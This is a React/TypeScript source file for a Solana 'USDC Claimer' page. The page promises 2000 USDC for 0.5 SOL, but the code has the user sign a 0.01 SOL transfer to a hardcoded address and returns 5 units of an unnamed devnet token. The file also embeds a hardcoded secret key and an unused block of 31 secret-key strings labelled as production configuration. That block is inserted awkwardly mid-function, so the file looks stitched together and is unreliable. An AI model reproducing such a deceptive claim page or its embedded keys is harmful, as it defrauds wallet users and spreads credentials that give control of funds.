/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3TVUzUp5UjJFEP2Go1uuPyV5ZFgimhUABgBJsS9NLBdso51nyQQs3rEMRdmYKqfkC8QALyUhtEp978aorwaiCg2V"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "u1KH46biBR3crefwrqdnM8tQhdNp8MYwhW8kMGFYWcsoCKQqArqZGJaC1k7at6ob71zgvG1c17Bw97JWJrhHUHu",
  "key1": "51UceK1hxsHH3tNQ24wGjp1sx2Vb1xx7kSBw1Ekx5rVQKuSR1FVsAzx2bmbsgsJJfupJL6p62TGucz4fxNK48LXc",
  "key2": "4575Qd2hWWe75Mwfab8Fenazf47WCyd4ZC5rCp5PXmDDb3tfp8To5SFcrBBoXFXqJmEc3pUCoX76aEvSbYdcaQtN",
  "key3": "5kQcRphXyAhU3zYpJVJaVtkUpmRumDAfk6nn7qakxvyJoq4xgzvCgmo3FrXT9v9WHWsQJNAixwVmp6dt7xwRJHH",
  "key4": "3nVP5oFqA3baLEuKfdW9HQCqJt8FrE6u2mrmVomckREjMcjxUxgAgvL3xSrpK394pzQ8ab4kBMaJvuzdHaAQ3vgz",
  "key5": "zXobp95PgZ9E715t9SXdbxx9BaY17bdMhJTaeJpe7ge4D7dnfqQUYA3QWx3zPbmoEcZCkcPxDSBovC8eWUxdNo9",
  "key6": "5WkwaMPjNuX315mujv3atk4Py6A2SC8QXzCrCkNrEEn4SmFzQH2ws4w3AxGd4H6jRFuxjsT98e668HV7esv5sZje",
  "key7": "3aaf26qxMhXBXK9xsTMQJ9HgtBJjoopnFpop5sJLDGzaLGDpn3dhLGfHzvCC2yJUiL7hm5Y3cbvRRhQSmFwRZw4x",
  "key8": "2HXoYgbhtVdmyxNBx7qk4HqA3AGZd6adu15Uf9Yf3PYW2H9xHJ5MHd4XRcKrZgyMKZdMmk8RdxYoSbSAfqbWzZ3k",
  "key9": "3bCJ5s6yaP9b7inayRqxnnDd4HxbVpsaa2uqWsBcbeyAr9YipqSm6dn2h7PExxe4SKu1EnPLk1JLwdS6airNoUcE",
  "key10": "4DMDWB5zE72ZWCR76Hwf3syAihBcbrBteNHrgAteQszU8oq9PCnnQgAUFNGL1SM8XGRDyTTudvqSqB3kxcrqTt22",
  "key11": "3itTWVQBbab6D66CARRUa5w3AXHkZzrwhqMht9rxoytkez5J28wecvFLioEgwiKGA4iyT8FDg4vbWJKmRi3LYH5J",
  "key12": "5hw4ifE4zF418LQ671bVtY5mvnB2aoRvSoC1TQKzTAogfReUCwHm5VxnB3ZhhJ3djzRj77qkLxEDH8QuAsaM51Lz",
  "key13": "9Hm7PL2WuZjkXbqwDZJseSYgXWswq3Yv2Lt8SLXJVmyanc21QtBRmbTbP6KEMHd7fWG9q3ZiinV1xJayNr25Vaq",
  "key14": "BirBdzxEzF3wuRMeXWHMc2X4dyesV8wNojLrxnouknPaSrWGrv5UoNqj7FxG8hLyfoygZyeKDT2DjVmis4Lk6pP",
  "key15": "36pcz9PQDkgAPi8BWe9iZncZCpKFR9Ye2NYYQzhviUqq4Hwk1axzAJSFCMNLkWbh4wPXbiHpSwL52y8VBjA2TrPw",
  "key16": "5zjshcFAtTH6GeitLHfPdfm2mtunwanVrRdeB6Cjb5fFzfMtW2HKsknJc3XFkWZ9bGbHusDsqHiAukeLRFjgZ66T",
  "key17": "4Yn8zmf7VJ8dRDDJwaAZNUqt7Fh6Ni2SPaWy3CePrrjnWf2K1Mzp46v9jdRt53xghsXdV2cPR1K7DZm3XEZE11t2",
  "key18": "3CtfWoCxejnZwERLgsagubHLMxnzQRHSk6hMcCguJADQDfApvyMgWFfah5nFhSDFCaoLBV2TqCSnAu6kckr89Pc8",
  "key19": "4WF1v7oeg8evosZrrAPS1TTo1n8pzbxxebgmrQb1DP2s6VDvJXuiRBeQDNCHBw8WYnBVgwzCUfzUps7PktrWze9Y",
  "key20": "5PjmxVqEeYiznbdpVTEXu1G8ZkHDXQ9jXKQWfuopc6eLvDmxeoCJwsMunv7nAUpwvuXgieYZFGgBxbUjBjcLiEaJ",
  "key21": "4euifqojATRAMAr6in14UBk2CzHQNY8dtwWUjfTeZFjRnXMU3PavfeGPn9r89WJDwMidLMe4tJZD9z6mhC248CN",
  "key22": "5cRiv564vPUL369Ha7mpBRmDkShwVToSbVd4X48GLpzKdhQFWHKNrxFckhVK5HZECGARYTm8rkqCdTUVyKJNNPq9",
  "key23": "2fQJHVtvTzMdB45wmPztZVUuzqb6829426urwD6VEdiTm5gnFKJQghjWyoyMCkU3sETAPvgARnG1D5mngwaTUrk3",
  "key24": "23nK3o8pv6HcyhQhLPA6fih2spkD4s1d2eGs1EknfXKHxwndCEHJSEfiZnwGKpMXGNhdyzjzgvCWRyXP8qUEtDzG",
  "key25": "4Lmk39kBYvKeBY6b7Fysxo5r7e3t6py271vMwbrp9m2YiDgU835vTv5Zqq4FU897MLKARyDnPktFuFjTFt4xxV8X",
  "key26": "F1Zg21vD7HrKmsrXJhsnMSkKUWdyL3Vezacyz1gLQJNK1FfL1UawG121D9cREmnpnvXMLn6xqYbofdEMHu94X3y",
  "key27": "2smYHbiSwn4oTnPjUCZeQY67SdsFg1BM6h3Fay9L7M2Ytg1zyGYwETMMmdd6GAxJq5CWufL17AGKS7KC2Uh8fFK3",
  "key28": "5acisdmMCw15THpPWxDbdnZrnqNAN3E4zdqwMJf9jgmSYzCqL5uSRwepkL8faNxJaw4WAtNhNXWpJE36ME5K22nd",
  "key29": "xjQUqbq7Cg18AZsqGw9ZEKzN828N7a2g4ceyu7PraeWDgyAbGXMeZX4s4a8XWaeb1ztGenDtpnHooU8Am8YUrJY",
  "key30": "3uufooDqdbozv9UKfwtaPaG46mBqDEcdMMdJHPc1gAW9zaKQXsRdTgQx5HKbNsi3KuTRDFgnsDoAuFWof8GApfxy"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
